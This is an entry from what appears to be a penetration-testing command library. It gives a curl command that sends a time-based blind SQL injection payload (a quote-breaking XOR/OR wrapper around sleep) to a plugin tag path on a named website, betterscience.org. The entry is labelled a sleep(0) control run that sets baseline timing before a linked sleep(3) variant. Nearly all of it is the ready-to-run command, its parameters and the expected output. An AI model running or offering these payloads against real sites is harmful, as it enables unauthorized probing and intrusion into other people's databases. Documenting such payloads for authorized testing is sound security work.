---
data: >-
  curl -s -w "%{time_total}s"
  "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22%2f*"
  -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer:
  https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1;
  WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
tags:
  - sqli
  - control
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.895Z'
id: 41bbc0eb-6b92-4e82-9e2f-f4fc100beb0a
verified: false
validated: true
submitted: true
---
# curl-sqli-payload-sleep-0

## Command

```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

## Description

Control payload with sleep(0) to verify no inherent delay in injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-w "%{time_total}s"` | Time | Yes |
| URL payload | Encoded with sleep(0) | Yes |
| Headers | Browser simulation | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "%{time_total}s" "https://target/plugin/tag/[control-payload]" > /dev/null
```

## Expected Output

Normal time, e.g., 0.28s.

## Related

- [[commands/curl-sqli-payload-sleep-3]]
- [[procedures/Verify-Control-Payload-with-No-Delay]]
